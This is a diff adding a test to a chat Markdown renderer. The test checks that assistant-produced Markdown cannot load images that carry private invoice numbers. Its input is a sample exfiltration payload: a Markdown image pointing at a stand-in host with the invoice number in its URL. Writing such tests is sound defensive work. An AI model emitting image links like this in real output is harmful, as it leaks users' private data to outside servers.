@@ -20,3 +20,14 @@ test("renders invoice numbers, lists, and links as safe Markdown", () => {
     ),
   ).not.toContain("javascript:");
 });
+
+test("assistant Markdown cannot load images containing private invoice data", () => {
+  const html = renderToStaticMarkup(
+    <ChatMarkdown>
+      {"Created **0000097** ![receipt](https://external.test/track?invoice=0000097)"}
+    </ChatMarkdown>,
+  );
+  expect(html).toContain("<strong>0000097</strong>");
+  expect(html).not.toContain("<img");
+  expect(html).not.toContain("external.test");
+});
